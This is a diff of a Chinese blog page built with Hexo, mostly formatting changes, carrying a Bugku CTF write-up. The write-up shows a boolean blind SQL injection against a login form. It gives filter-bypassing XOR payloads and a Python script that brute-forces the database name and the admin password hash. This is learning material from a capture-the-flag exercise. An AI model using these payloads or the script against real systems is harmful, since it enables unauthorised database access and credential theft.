@@ -6,10 +6,10 @@
 
 
 <html class="theme-next gemini use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="theme-color" content="#222">
 
 
@@ -27,8 +27,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,9 +81,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/180x180.png?v=5.1.4">
@@ -103,31 +103,31 @@
 
 
 
-  <meta name="keywords" content="Web,Bugku,基于布尔的SQL盲注," />
+  <meta name="keywords" content="Web,Bugku,基于布尔的SQL盲注,">
 
 
 
 
 
-  <link rel="alternate" href="/atom.xml" title="AbelChe's Blog" type="application/atom+xml" />
+  <link rel="alternate" href="/atom.xml" title="AbelChe's Blog" type="application/atom+xml">
 
 
 
 
 
 
-<meta name="description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯： username does not exist!和password error!,那我们可以利用这两个返">
+<meta name="description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯: username does not exist!和password error!,那我们可以利用这两个返">
 <meta name="keywords" content="Web,Bugku,基于布尔的SQL盲注">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WP-Bugku-login3(SKCTF)">
 <meta property="og:url" content="http://AbelChe.com/2018/08/17/Writeup/bugkuWeb/WP-Bugku-login3-SKCTF/index.html">
 <meta property="og:site_name" content="AbelChe&#39;s Blog">
-<meta property="og:description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯： username does not exist!和password error!,那我们可以利用这两个返">
+<meta property="og:description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯: username does not exist!和password error!,那我们可以利用这两个返">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-17T04:23:59.000Z">
+<meta property="og:updated_time" content="2019-08-15T11:02:02.460Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WP-Bugku-login3(SKCTF)">
-<meta name="twitter:description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯： username does not exist!和password error!,那我们可以利用这两个返">
+<meta name="twitter:description" content="题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯: username does not exist!和password error!,那我们可以利用这两个返">
 
 
 
@@ -157,7 +157,7 @@
 
 
 
-  <link rel="canonical" href="http://AbelChe.com/2018/08/17/Writeup/bugkuWeb/WP-Bugku-login3-SKCTF/"/>
+  <link rel="canonical" href="http://AbelChe.com/2018/08/17/Writeup/bugkuWeb/WP-Bugku-login3-SKCTF/">
 
 
 
@@ -191,7 +191,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">AbelChe's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -221,7 +221,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -231,7 +231,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -241,7 +241,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -251,7 +251,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
             
             分类
           </a>
@@ -261,7 +261,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -271,7 +271,7 @@
         <li class="menu-item menu-item-在线运行">
           <a href="/runcode/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-code"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-code"></i> <br>
             
             在线运行
           </a>
@@ -281,7 +281,7 @@
         <li class="menu-item menu-item-友链">
           <a href="/friends/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-at"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-at"></i> <br>
             
             友链
           </a>
@@ -291,7 +291,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -304,7 +304,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -325,9 +325,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -339,7 +337,7 @@
   
 </nav>
 
-
+<link rel="manifest" href="/manifest.json">
 
  </div>
     </header>
@@ -368,7 +366,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="AbelChe">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
       <meta itemprop="image" content="/uploads/images/head.png">
     </span>
 
@@ -409,14 +407,14 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-17T12:23:59+08:00">
-                2018-08-17
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-15T19:02:02+08:00">
+                2019-08-15
               </time>
             
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -459,7 +457,7 @@
           
             <span class="post-meta-divider">|</span>
             <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
             </span>
           
 
@@ -515,18 +513,18 @@
 <p>username输入admin，结果是存在的，返回密码错误</p>
 <p>admin后加上单引号，但是返回是使用者名称不存在</p>
 <p>这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯，</p>
-<p>也就不能使用报错注入了，我们发现有两种返回资讯：</p>
+<p>也就不能使用报错注入了，我们发现有两种返回资讯:</p>
 <p>username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。</p>
 <p>毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。</p>
-<p>我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是：</p>
+<p>我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是:</p>
 <p>select password,username from users where username=”我们输入的使用者名称”</p>
 <p>如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成</p>
 <p>where username=’admin’ and (substring(database(),1,1)=’a’)</p>
 <p>如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。</p>
 <p>但是这道题过滤了and！ ！ ！</p>
-<p>尝试加上and返回：<br>经过尝试发现还过滤了空格，逗号，等号，for</p>
+<p>尝试加上and返回:<br>经过尝试发现还过滤了空格，逗号，等号，for</p>
 <p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替</p>
-<p>那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则：</p>
+<p>那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则:</p>
 <p>1^1=0 1^0=1 0^0=0</p>
 <p>就是说只有两个不同的布林值运算结果为1，其他为零</p>
 <p>不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。</p>
@@ -545,13 +543,13 @@
 <p>因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。</p>
 <p>补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。</p>
 <p>就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error!</p>
-<p>资料库名最后可以得到是：blindsql</p>
+<p>资料库名最后可以得到是:blindsql</p>
 <p>下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。</p>
 <p>没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下</p>
 <p>admin’^(select(1)from(admin))^1# 返回password error!说明猜对了</p>
 <p>猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。</p>
 <p>为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。</p>
-<p>然后猜password的值，暴力猜解，与猜资料库类似：</p>
+<p>然后猜password的值，暴力猜解，与猜资料库类似:</p>
 <p>admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0#</p>
 <p>得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests str_all=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/="</span> url=<span class="string">"http://118.89.219.210:49167/index.php"</span> r=requests.session() <span class="function"><span class="keyword">def</span> <span class="title">databasere</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): fla = <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod=<span class="string">"admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j print(resutlt) <span class="keyword">if</span> fla == <span class="number">0</span>: <span class="keyword">break</span> <span class="function"><span class="keyword">def</span> <span class="title">password</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>): fla=<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i <span class="number">1</span>),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j fla=<span class="number">1</span> print(<span class="string">'**************************'</span>,resutlt) <span class="keyword">if</span> fla==<span class="number">0</span>: <span class="keyword">break</span> <span class="comment">#databasere() password()</span></span><br></pre></td></tr></table></figure>
@@ -564,7 +562,7 @@
     
       <div>
         <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
-    <img id="wechat_subscriber_qcode" src="/uploads/images/wechatQR_2.JPG" alt="AbelChe wechat" style="width: 200px; max-width: 100%;"/>
+    <img id="wechat_subscriber_qcode" src="/uploads/images/wechatQR_2.JPG" alt="AbelChe wechat" style="width: 200px; max-width: 100%;">
     <div>扫码加微信</div>
 </div>
 
@@ -582,14 +580,14 @@
 
     
       <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/wechatpay.png" alt="AbelChe 微信支付"/>
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="AbelChe 微信支付">
         <p>微信支付</p>
       </div>
     
 
     
       <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/alipay.png" alt="AbelChe 支付宝"/>
+        <img id="alipay_qr" src="/images/alipay.png" alt="AbelChe 支付宝">
         <p>支付宝</p>
       </div>
     
@@ -717,9 +715,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <a href="/"><img class="site-author-image" itemprop="image"
-                src="/uploads/images/head.png"
-                alt="AbelChe" /></a>
+              <a href="/"><img class="site-author-image" itemprop="image" src="/uploads/images/head.png" alt="AbelChe"></a>
             
               <a href="/"><p class="site-author-name" itemprop="name">AbelChe</p></a>
               <p class="site-description motion-element" itemprop="description"></p>
@@ -732,7 +728,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-count">61</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -754,7 +750,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-count">79</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -823,7 +819,7 @@
           
             <div class="cc-license motion-element" itemprop="license">
               <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
-                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons">
               </a>
             </div>
           
@@ -898,7 +894,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">40.4k</span>
+    <span title="Site words total count">41.1k</span>
   
 </div>
 
